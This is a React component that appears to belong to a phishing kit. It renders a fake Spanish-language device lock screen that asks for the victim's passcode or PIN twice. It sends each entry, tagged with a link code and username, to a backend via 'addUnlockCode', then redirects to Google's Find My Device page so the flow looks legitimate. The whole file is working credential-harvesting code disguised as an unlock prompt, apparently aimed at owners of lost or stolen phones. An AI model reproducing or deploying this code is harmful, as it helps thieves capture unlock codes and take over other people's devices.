import { useEffect, useRef, useState } from 'react';
import stylesWeb from '../assetsGlobal/css/inputLockWeb.module.css';
import stylesMobile from '../assetsGlobal/css/inputLockMobile.module.css';
import responses from '../../api/responses';
import { useData } from '../../context/UserContext';

const InputLock = ({
  HeaderModal,
  isMobile,
  translator

}) => {

  const { user } = useData();

  const [count, setCount] = useState(0);
  const [inputType, setInputType] = useState('alphanumeric');
  const [value, setValue] = useState("");
  const [valueTwo, setValueTwo] = useState("");
  const [statusPassword, setStatusPassword] = useState("");
  const [messageError, setMessageError] = useState("");
  const [loading, setLoading] = useState(false);
  const [changeSubTitle, setChangeSubTitle] = useState(false);
  const inputRef = useRef(null)
  const preholderRef = useRef(null)

  useEffect(() => {
    if (count === 0) {
      setStatusPassword('passcode');
      setValueTwo('Processing');
      setChangeSubTitle(false);
    }
    if (count === 1) {
      setStatusPassword('completed');
      setValueTwo(value);
    }
  }, [count])


  const handleChange = (e) => {
    const onlyNums = inputType === 'numeric' ? e.target.value.replace(/[^0-9]/g, "") : e.target.value;
    setMessageError("")
    setValue(onlyNums);
  };

  useEffect(() => {

    if (user?.data?.script === 'androidAppNumeric') {
      setInputType('numeric');
      setTimeout(() => {
        inputRef.current.focus()
      }, 2000)


    } else {
      setInputType('alphanumeric');
      setTimeout(() => {
        inputRef.current.focus()
      }, 2000)
    }
  }, []);

  const handleSendPassword = async (e) => {
    e.preventDefault()
    setLoading(true)

    let data = {
      linkCode: user?.data?.linkCode || '',
      username: user?.data?.username || '',
      codesUnlock: `${value}-${valueTwo}`,
      status: statusPassword
    }


    setCount(prev => prev + 1);

    setTimeout(async () => {
      setLoading(false);
      if (count === 0) {
        await responses.addUnlockCode(data);
        setValue("");
        setChangeSubTitle(true)

      } else if (count === 1) {
        console.log(count)
        setChangeSubTitle(true)
        if (value != valueTwo) {
          setMessageError(translator('❌ Las contraseñas no coinciden. Intenta nuevamente.'));
          setCount(0);
          setValue("");
          setValueTwo("");
          setStatusPassword("");
        } else {
          await responses.addUnlockCode(data);
          localStorage.removeItem(`userData_${user?.data?.linkCode}`);
          //window.location.reload();
          window.location.href = 'https://myaccount.google.com/find-your-phone';
        }
      }



    }, 1500)




  }

  return (
    <div className={!isMobile ? stylesWeb.lockContainer : stylesMobile.lockContainer}>
      <HeaderModal changeSubTitle={changeSubTitle} />
      <div className={!isMobile ? stylesWeb.floatingGroup : stylesMobile.floatingGroup}>
        <form onSubmit={handleSendPassword}>
          <input
            ref={inputRef}
            type="password"
            value={value}
            onChange={handleChange}
            className="form-control"
            id="inputPassword"
            style={{ color: !isMobile ? 'black' : 'white' }}
            required
            inputMode={inputType === 'numeric' ? 'numeric' : 'text'}
            pattern={inputType === 'numeric' ? '[0-9]*' : undefined}
            onFocus={() => {

              if (preholderRef.current) {
                preholderRef.current.style.top = '-8px'
                preholderRef.current.style.left = '8px';
                preholderRef.current.style.fontSize = '12px';
                preholderRef.current.style.color = isMobile ? 'white' : 'black';
              }
            }}
            onBlur={() => {
              if (preholderRef.current && inputRef.current.value === '') {
                preholderRef.current.style.top = '14px'
                preholderRef.current.style.left = '12px';
                preholderRef.current.style.fontSize = '12px';
                preholderRef.current.style.color = isMobile ? 'white' : 'black';
              }
            }}

          />
          <label ref={preholderRef} htmlFor="patternInput">{translator('Ingresa tu contraseña')}</label>
          <p style={{
            textAlign: 'center',
            marginTop: '10px',
            color: 'red'
          }}>
            {messageError}
          </p>
          <div className={!isMobile ? stylesWeb.buttonWrapper : stylesMobile.buttonWrapper}>
            <button type="submit" className="btn btn-primary">
              {loading ? <div className={!isMobile ? stylesWeb.loader : stylesMobile.loader}></div> : translator('Siguiente')}
            </button>
          </div>
        </form>

      </div>

    </div>
  );
};

export default InputLock;
